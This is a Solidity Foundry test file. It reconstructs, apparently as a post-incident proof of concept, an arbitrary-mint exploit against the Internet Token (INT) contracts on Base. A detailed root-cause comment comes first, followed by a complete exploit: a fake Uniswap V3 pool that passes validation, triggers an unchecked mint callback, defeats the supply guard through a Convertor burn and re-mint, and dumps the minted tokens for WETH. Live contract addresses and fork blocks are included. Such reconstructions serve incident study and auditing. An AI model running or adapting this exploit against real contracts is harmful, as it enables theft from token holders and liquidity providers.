// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Internet Token (INT) - permissionless arbitrary-mint via a fake Uniswap V3 pool. Base, 2026-09.
//
// Attack tx : 0xed62bb27bd1058d3d7cc93d55421d6d0001ced8cb4529b02773f5126a4edb08b
// Block     : 51593878 (fork at parent 51593877)
// Attacker  : EOA 0x5F7cE6395818857aC20730dc990F614356D1Ec68 deploys a throwaway contract; the
//             whole attack runs inside that contract's CONSTRUCTOR (the tx `to` is empty, and the
//             receipt reports a contractAddress -> contract-creation tx, confirmed from the trace).
//
// Contracts (verified source pulled from Basescan, chainid 8453):
//   RewardToken (INT)          : 0x968D6A288d7B024D5012c0B25d67A889E4E3eC19
//   LiquidityUnifier           : 0x837DBAbc4f5FA78BAF177597edbDa09645822032  (holds INT minter role)
//   Convertor                  : 0x6b82fDFC0344Bd76d5Cb58BC24D0FfE947975516  (INT <-> bridged token)
//   OptimismMintableERC20      : 0x1D34e08120dbD1Ea9BDBcD90C2dC919b50Ddff4C  (the "transferrable" leg)
//   Real INT/WETH Uniswap V3   : 0xDEc6EadbD8eD3F655CBA4Bb4eeFF6fB43B16969d  (token0=WETH, token1=INT)
//   WETH                       : 0x4200000000000000000000000000000000000006
//
// ROOT CAUSE (confirmed line-by-line against the deployed verified source, not just the alert):
//
//   1. LiquidityUnifier.swapV3(address token, address pool) is PERMISSIONLESS (no role/onlyRole).
//      Its only validation is:
//        _validatePool(pool)        -> pool != 0, pool.code.length != 0, !_excludedPools.contains(pool)
//        _validatePoolV3Tokens(..)  -> pool.token0()/token1() must equal {rewardToken, token} in
//                                      either order.
//      There is NO Uniswap factory / pool-registry check anywhere. Both conditions are trivially
//      satisfied by a minimal attacker-deployed contract that returns the right token0()/token1()
//      and is not on the exclusion list.
//
//   2. swapV3 then sets `currentPoolV3 = pool` and calls `IUniswapV3Pool(pool).swap(...)`. Because
//      `pool` is the attacker's fake pool, that call lands in attacker code.
//
//   3. The fake pool re-enters LiquidityUnifier.uniswapV3SwapCallback(amount0Delta, amount1Delta, _).
//      That callback's ONLY guard is `msg.sender == currentPoolV3`. currentPoolV3 IS the fake pool
//      (set in step 2), so the guard passes, and the callback runs:
//          RewardToken(rewardToken).mint(_currentPoolV3, amount.toUint256());
//      where amount = (amount0Delta > 0 ? amount0Delta : amount1Delta) is supplied by the fake pool.
//      => arbitrary INT minted, to the fake pool, in an attacker-chosen amount.
//
//   4. The one supply guard is the `validateSupply` modifier on swapV3: it records
//      totalSupply() before the body and reverts if totalSupply() is larger after. This is defeated
//      by routing the freshly minted INT through the project's Convertor DURING the fake pool's
//      swap() callback (i.e. still inside swapV3, before the post-check):
//          Convertor.convert(INT, X)  -> mintableToken.burn(caller, X); transferrableToken.transfer(caller, X)
//      Burning the X INT restores totalSupply() to its original value, so the post-`_` check sees no
//      increase. After swapV3 returns (outside the modifier) the attacker converts back:
//          Convertor.convert(OTHER, X) -> transferrableToken.transferFrom(caller,this,X); mintableToken.mint(caller, X)
//      re-minting the X INT with the supply guard no longer in scope. Net: X new INT, guard bypassed.
//
//   Verified the three specific claims the alert asked to confirm:
//     * swapV3 pool validation is code-existence + exclusion-list + token0()/token1() only, no
//       factory/registry check (LiquidityUnifier.sol _validatePool / _validatePoolV3Tokens).
//     * uniswapV3SwapCallback trusts msg.sender == currentPoolV3 with currentPoolV3 attacker-set.
//     * validateSupply is beaten by the Convertor round-trip (burn INT mid-call, re-mint after),
//       not by any other mechanism. Convertor.convert branches on `from`: burn INT / send OTHER, or
//       pull OTHER / mint INT (verified in Convertor.sol).
//
// On-chain figures (decoded from the receipt Transfer logs, all match the alert):
//   minted X          = 925,411,678.379023100 INT   (callback mint)
//   dumped into pool  = 161,265,976.195260020 INT   -> 5.846988019325688 WETH
//   kept by attacker  = 764,145,702.183763080 INT   (X - dumped)
//
// This PoC is a from-scratch reconstruction: a named InternetTokenExploit contract deploys a minimal
// FakePool, and every protocol interaction is a real typed call into the live verified contracts
// (swapV3, uniswapV3SwapCallback, Convertor.convert, and a real swap on the actual INT/WETH V3 pool).
// No bytecode blob, no raw calldata replay, no settled-state shortcut.

interface ILiquidityUnifier {
    function swapV3(address token, address pool) external;
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

interface IConvertor {
    // from == INT (mintable)     -> burns INT from caller, sends OTHER to caller
    // from == OTHER (transferrable) -> pulls OTHER from caller, mints INT to caller
    function convert(address from, uint256 amount) external;
}

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

// Minimal fake "pool": returns token0()/token1() so LiquidityUnifier's validation passes, and its
// swap() re-enters the unifier's callback to trigger the arbitrary mint. The same contract also
// implements uniswapV3SwapCallback so it can pay INT into the REAL INT/WETH pool for the profit leg.
contract FakePool {
    address internal immutable INT;
    address internal immutable OTHER;
    address internal immutable WETH;
    ILiquidityUnifier internal immutable UNIFIER;
    IConvertor internal immutable CONVERTOR;
    IUniswapV3Pool internal immutable REAL_POOL;
    address internal immutable OWNER;

    uint256 internal mintAmount;

    // sqrt price limit for a token1->token0 sell (zeroForOne == false) on the real pool.
    uint160 internal constant MAX_SQRT_RATIO_MINUS_ONE = 1461446703485210103287273052203988822378723970342 - 1;

    constructor(
        address _int,
        address _other,
        address _weth,
        ILiquidityUnifier _unifier,
        IConvertor _convertor,
        IUniswapV3Pool _realPool
    ) {
        INT = _int;
        OTHER = _other;
        WETH = _weth;
        UNIFIER = _unifier;
        CONVERTOR = _convertor;
        REAL_POOL = _realPool;
        OWNER = msg.sender;
    }

    // ---- fake Uniswap V3 pool surface used by LiquidityUnifier's validation ----
    function token0() external view returns (address) {
        return INT; // == rewardToken
    }

    function token1() external view returns (address) {
        return OTHER; // == the `token` argument passed to swapV3
    }

    // Called by LiquidityUnifier inside swapV3. We ignore the passed args and instead drive the
    // unifier's own callback with the mint amount WE choose, then neutralize the supply increase by
    // converting the freshly minted INT into OTHER (burns INT -> restores totalSupply) before swapV3
    // finishes and its validateSupply post-check runs.
    function swap(
        address, /* recipient */
        bool, /* zeroForOne */
        int256, /* amountSpecified */
        uint160, /* sqrtPriceLimitX96 */
        bytes calldata /* data */
    ) external returns (int256, int256) {
        require(msg.sender == address(UNIFIER), "only unifier");

        // trigger arbitrary mint of `mintAmount` INT to this contract (currentPoolV3 == this)
        UNIFIER.uniswapV3SwapCallback(int256(mintAmount), int256(mintAmount), "");

        // burn the INT back out via the Convertor so supply is restored before validateSupply checks
        CONVERTOR.convert(INT, mintAmount);

        return (0, 0);
    }

    // Called by the REAL INT/WETH V3 pool during the profit swap: pay the INT we owe.
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == address(REAL_POOL), "only real pool");
        // token1 == INT, so selling INT for WETH makes amount1Delta the positive amount owed.
        if (amount1Delta > 0) {
            IERC20(INT).transfer(msg.sender, uint256(amount1Delta));
        }
        if (amount0Delta > 0) {
            IERC20(WETH).transfer(msg.sender, uint256(amount0Delta));
        }
    }

    function run(uint256 _mintAmount, uint256 dumpAmount) external {
        require(msg.sender == OWNER, "only owner");
        mintAmount = _mintAmount;

        // Convertor pulls OTHER from us on the way back; INT burn on the way out needs no approval.
        IERC20(INT).approve(address(CONVERTOR), type(uint256).max);
        IERC20(OTHER).approve(address(CONVERTOR), type(uint256).max);

        // 1) permissionless swapV3 against our fake pool -> arbitrary mint + supply-neutralizing burn
        //    (token = OTHER so _validatePoolV3Tokens sees {INT, OTHER} and passes)
        UNIFIER.swapV3(OTHER, address(this));

        // 2) re-mint the INT now that validateSupply is out of scope: OTHER -> INT
        CONVERTOR.convert(OTHER, mintAmount);

        // 3) realize WETH by dumping part of the minted INT into the real INT/WETH pool
        //    zeroForOne = false (token1 INT -> token0 WETH), exact input = dumpAmount
        REAL_POOL.swap(address(this), false, int256(dumpAmount), MAX_SQRT_RATIO_MINUS_ONE, "");

        // 4) forward the loot to the owner (attacker) contract
        uint256 wethBal = IERC20(WETH).balanceOf(address(this));
        if (wethBal > 0) IERC20(WETH).transfer(OWNER, wethBal);
        uint256 intBal = IERC20(INT).balanceOf(address(this));
        if (intBal > 0) IERC20(INT).transfer(OWNER, intBal);
    }
}

// The attacker contract. Mirrors the real tx: the whole exploit runs from a single deployment, in
// the constructor, with no attacker capital and no privileged role.
contract InternetTokenExploit {
    constructor(
        address int_,
        address other,
        address weth,
        ILiquidityUnifier unifier,
        IConvertor convertor,
        IUniswapV3Pool realPool,
        address recipient,
        uint256 mintAmount,
        uint256 dumpAmount
    ) {
        FakePool fake = new FakePool(int_, other, weth, unifier, convertor, realPool);
        fake.run(mintAmount, dumpAmount);

        // hand profits from this contract to the profit sink the test tracks
        uint256 wethBal = IERC20(weth).balanceOf(address(this));
        if (wethBal > 0) IERC20(weth).transfer(recipient, wethBal);
        uint256 intBal = IERC20(int_).balanceOf(address(this));
        if (intBal > 0) IERC20(int_).transfer(recipient, intBal);
    }
}

contract InternetTokenExploitTest is BaseTestWithBalanceLog {
    address constant INT = 0x968D6A288d7B024D5012c0B25d67A889E4E3eC19;
    address constant OTHER = 0x1D34e08120dbD1Ea9BDBcD90C2dC919b50Ddff4C;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    ILiquidityUnifier constant UNIFIER = ILiquidityUnifier(0x837DBAbc4f5FA78BAF177597edbDa09645822032);
    IConvertor constant CONVERTOR = IConvertor(0x6b82fDFC0344Bd76d5Cb58BC24D0FfE947975516);
    IUniswapV3Pool constant REAL_POOL = IUniswapV3Pool(0xDEc6EadbD8eD3F655CBA4Bb4eeFF6fB43B16969d);

    // Attacker-chosen mint size and dump size, exactly as decoded from the on-chain receipt logs.
    uint256 constant MINT_AMOUNT = 0x02fd7b8b9b6ae2957e395f97; // 925,411,678.379023100 INT
    uint256 constant DUMP_AMOUNT = 0x856566164204289e81c00a; //  161,265,976.195260020 INT

    function setUp() public {
        vm.createSelectFork("base", 51_593_877); // parent of the exploit block
        multiAssetLog = true;
        fundingTokens.push(WETH);
        fundingTokens.push(INT);
    }

    function testExploit() public balanceLog {
        address recipient = address(this); // profit sink; balanceLog tracks it

        assertEq(IERC20(WETH).balanceOf(recipient), 0, "recipient should start with 0 WETH");
        assertEq(IERC20(INT).balanceOf(recipient), 0, "recipient should start with 0 INT");

        // One deployment, zero attacker capital, no signatures, no privileged role.
        new InternetTokenExploit(
            INT, OTHER, WETH, UNIFIER, CONVERTOR, REAL_POOL, recipient, MINT_AMOUNT, DUMP_AMOUNT
        );

        uint256 wethGained = IERC20(WETH).balanceOf(recipient);
        uint256 intGained = IERC20(INT).balanceOf(recipient);

        emit log_named_decimal_uint("WETH profit realized", wethGained, 18);
        emit log_named_decimal_uint("INT retained by attacker", intGained, 18);

        // ~5.85 WETH realized from dumping ~161.3M of the minted INT
        assertApproxEqRel(wethGained, 5.846988019325688e18, 0.01e18, "WETH profit off from on-chain ~5.85");
        // ~764.1M INT kept (minted 925.4M minus 161.3M dumped)
        assertEq(intGained, MINT_AMOUNT - DUMP_AMOUNT, "retained INT != minted - dumped");
        assertApproxEqRel(intGained, 764_145_702.18376308e18, 0.01e18, "retained INT off from on-chain ~764.1M");
    }
}
